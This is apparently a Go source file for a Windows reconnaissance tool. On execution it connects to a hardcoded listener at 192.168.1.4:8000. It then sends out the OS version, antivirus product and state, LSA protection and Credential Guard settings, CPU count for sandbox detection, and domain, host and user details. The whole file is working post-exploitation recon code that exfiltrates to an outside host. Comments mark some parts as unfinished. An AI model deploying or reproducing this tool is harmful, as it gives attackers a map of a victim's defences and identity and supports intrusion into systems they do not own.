// Kyhle Ohlinger
// GO Windows Recon executable

package main

//Registry Import
import "golang.org/x/sys/windows/registry"
import (
	"fmt"
	"os"
	"net"
	"os/user"
	"os/exec"
	"runtime"
	"strings"
)

type error interface {
	Error() string
}

func check(err error, conn net.Conn){
	if err != nil {
		fmt.Fprintf(conn, err.Error())
	}
}

func main(){
	// connect to listener
	conn, err := net.Dial("tcp", "192.168.1.4:8000")
	check(err, conn)

	fmt.Fprintf(conn, "== Windows Reconnaissance Information ==\n\n")
	
	winEnum(conn) // Windows version enumeration
	winProtect(conn) // Windows protection enumeration
	CPU(conn) // CPU checks
	Antivirus(conn) // Antivirus checks
	User_Host(conn) // User and host enumeration
	return
}

func User_Host(conn net.Conn){
	host,err:= os.Hostname()
	check(err, conn)
	
	user,err := user.Current()
	check(err, conn)

	//Not working at this point
	//currUser := strings.Split(user.Username,"\\")
	//netUser, err := exec.Command("cmd","/C", "net user "+currUser[1]+" /domain", "\n").Output()
	//check(err, conn)
	
	var domainQuery string
	domainQuery = "wmic computersystem get domain | findstr /V /C:Domain"
	domain, err := exec.Command("cmd","/C", domainQuery, "\n").Output()
	check(err, conn)

	// Output User and Host 
	fmt.Fprintf(conn,"User and Host:\n===============================\n")
	fmt.Fprintf(conn,"Domain Name is: %s",  strings.TrimSuffix(string(domain), "\n"))
	fmt.Fprintf(conn,"Hostname is: " + host+"\n")
	fmt.Fprintf(conn,"Current User is: " + user.Name+"with UID: "+ user.Uid+"\n")
	fmt.Fprintf(conn,"Current Username is: " + user.Username+"\n")
	fmt.Fprintf(conn,"Current Home Directory is: " + user.HomeDir+"\n")
}

func CPU(conn net.Conn){
	CPUCounter := runtime.NumCPU()

	// Output Number of CPUs - If 1 then probably a sandbox
	fmt.Fprintf(conn, "\nCPUs:\n===============================\n")
	fmt.Fprintf(conn,"Number of CPUs: %d\n", CPUCounter)
}

func winEnum(conn net.Conn){
	// Windows Enumeration
	winInfo, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	check(err, conn)
	defer winInfo.Close()

	CurrentVersion, _, err := winInfo.GetStringValue("CurrentVersion")
	check(err, conn)

	ProductName , _, err := winInfo.GetStringValue("ProductName")
	check(err, conn)

	MajorVersion, _, err := winInfo.GetIntegerValue("CurrentMajorVersionNumber")
	check(err, conn)

	MinorVersion, _, err := winInfo.GetIntegerValue("CurrentMinorVersionNumber")
	check(err, conn)

	CurrentBuild, _, err := winInfo.GetStringValue("CurrentBuild")
	check(err, conn) 

	var archQuery string
	archQuery = "wmic OS get OSArchitecture | findstr /V /C:OSArchitecture"
	arch, err := exec.Command("cmd","/C", archQuery, "\n").Output()
	check(err, conn)

	// Output Windows Version
	fmt.Fprintf(conn,"Windows Version:\n===============================\n")
	fmt.Fprintf(conn,"Current Version: %s\n", CurrentVersion)
	fmt.Fprintf(conn,"Product Name: %s\n", ProductName)
	fmt.Fprintf(conn,"Current Minor Version Number: %d\n", MinorVersion)
	fmt.Fprintf(conn,"Current Major Version Number: %d\n", MajorVersion)
	fmt.Fprintf(conn,"Current Build: %s\n", CurrentBuild)	
	fmt.Fprintf(conn,"Current Architecture: %s\n", arch)
}

func winProtect(conn net.Conn){
	// Registry key location
	protectionInfo, err := registry.OpenKey(registry.LOCAL_MACHINE,`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA`, registry.QUERY_VALUE)
	check(err, conn)
	defer protectionInfo.Close()

	lsaProtection, _, err := protectionInfo.GetStringValue("RunAsPPL")
	check(err, conn)
	credentialGuard, _, err := protectionInfo.GetStringValue("LsaCfgFlags")
	check(err, conn)

	// Output Protection Status - WIP not sure if it works 
	fmt.Fprintf(conn,"LSA Protection: %s\n", lsaProtection)	
	fmt.Fprintf(conn,"Credential Guard: %s\n", credentialGuard)	
}

func Antivirus(conn net.Conn){
	var ProductQuery string
	var StateQuery string
	ProductQuery = "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName | findstr /V /C:displayName"
	StateQuery = "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get productState | findstr /V /C:productState"
	
	product, err := exec.Command("cmd","/C", ProductQuery, "\n").Output()
	check(err, conn)

	state, err := exec.Command("cmd","/C", StateQuery, "\n").Output()
	check(err, conn)

	// Output Antivirus Information
	fmt.Fprintf(conn,"\nAntivirus:\n===============================\n")
	fmt.Fprintf(conn,"Antivirus Product: %s",  strings.TrimSuffix(string(product), "\n"))
	fmt.Fprintf(conn,"Antivirus State: %s\n",   strings.TrimSuffix(string(state), "\n"))	
}
